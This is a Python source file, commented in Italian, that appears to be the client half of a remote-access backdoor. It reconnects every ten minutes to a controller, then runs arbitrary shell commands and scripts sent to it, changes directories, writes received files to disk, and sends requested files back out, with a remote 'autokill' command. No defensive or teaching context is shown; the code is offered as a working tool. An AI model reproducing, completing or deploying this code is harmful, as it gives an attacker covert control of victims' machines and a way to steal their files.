#import
import os
import function
import time
Connection = function.Connection()
Comand = function.Comand()

# loop che tenta la connessione al targhet ogni 10 min
def tryconn():
    while True:
        stat_conn = Connection.INIT_CONN()
        if stat_conn == True:
            break
        time.sleep(600)

# funzione che esegue le operazioni richieste
def service():
    kill = None
    try:
        print("inizio ciclo...")
        #servizio client
        while True:
            #recezione pacchetto

            payload = Connection.RECV()

            #verifica funzionamento pacchetto
            if payload != False:
                #recezione file
                if payload.split(b'$')[0] == b'file' and len(payload.split(b'$')) >= 3:
                    try:
                        file = open(payload.split(b'$')[-1].decode(), "wb+")
                        response = payload.split(b'$')
                        response.pop(0)
                        payload = b''
                        for bo in response:
                            payload = payload + bo + b'$'
                        payload = payload.decode("ascii", "ignore")
                        payload = list(payload)
                        payload.pop(-1)
                        payload = "".join(payload).encode()
                        #scrittura file
                        file.write(payload)
                        file.close()
                        Connection.SEND("file ricevuto...")
                    except:
                        Connection.SEND("impossibile eseguire l'operazione richiesta...")

                else:
                    try:
                        #interpretazione pacchetto
                        payload = payload.decode()
                        payload = list(payload)
                        index = []
                        index.append(payload[0])
                        index.append(payload[1])
                        index.append(payload[2])
                        index = "".join(index)
                        payload.pop(0)
                        payload.pop(0)
                        payload.pop(0)
                        payload = "".join(payload)
                    except:
                        Connection.SEND("impossibile interpretare il frame")

                # esegue un comando
                    if index == "com":
                        #chiusura connessione
                        if payload == "exit":
                            break

                        #navigazione cartelle
                        elif payload.split(" ")[0] == "cd" and len(payload.split()) >= 2:
                            #cartella precedente
                            if payload.split(" ")[1] == ".." and len(payload.split(" ")[1]) == 2:
                                try:
                                    currentdir = os.getcwd().split("\\")
                                    currentdir.pop(-1)
                                    backdir = "\\".join(currentdir) + "\\"
                                    os.chdir(backdir)
                                    Connection.SEND("")
                                except:
                                    Connection.SEND("errore nell'esecuzione del comando...")
                            else:
                                #cambio Current Worcking DIRectory
                                try:
                                    payload = payload.split(" ")
                                    payload.pop(0)
                                    payload = " ".join(payload)
                                    os.chdir(payload)
                                    Connection.SEND("")
                                except:
                                    Connection.SEND("cartella inraggiungibile")

                        #invio file per download
                        elif payload.split(" ")[0] == "download" and len(payload.split()) >= 2:
                            fileopen = False
                            #apertura file
                            try:
                                payload = payload.split(" ")
                                payload.pop(0)
                                payload = " ".join(payload)
                                file = open(payload, "rb")
                                fileopen = True
                            except:
                                Connection.SEND("impossibile inviare il file richiesto")

                            #lettura file
                            if fileopen == True:
                                try:
                                    content = file.read()
                                    file.close()
                                    Connection.SEND( b'file$' + content + b'$' + payload.encode())
                                except:
                                    Connection.SEND("impossibile leggere il file")

                        elif payload == "autokill":
                            Connection.CLOSE_CONN()
                            kill = True
                            break

                        else:
                            #esecuzione comandi cmd
                            output = Comand.EX_COMMAND(payload)
                            print(output)
                            Connection.SEND(output)

                    #esegue uno script
                    elif index == "scr":
                        output = Comand.EX_SCRIPT(payload)
                        Connection.SEND(output)
                    else:
                        print("errore nel crc32")
                        pass

            elif payload == "recv err":
                Connection.CLOSE_CONN()
                break

            else:
                print("errore nel crc32")
                conn = Connection.SEND("crc32 err")
                if conn == False:
                    Connection.CLOSE_CONN()
                    break
    except:
        print("errore connessione...")
        pass

    return kill

while True:
    time.sleep(10)
    #tentativo connessione
    tryconn()
    print("connessione stabilita...")
    #servizio del client
    kill = service()
    #verifica chiusura programma
    if kill == True:
        quit()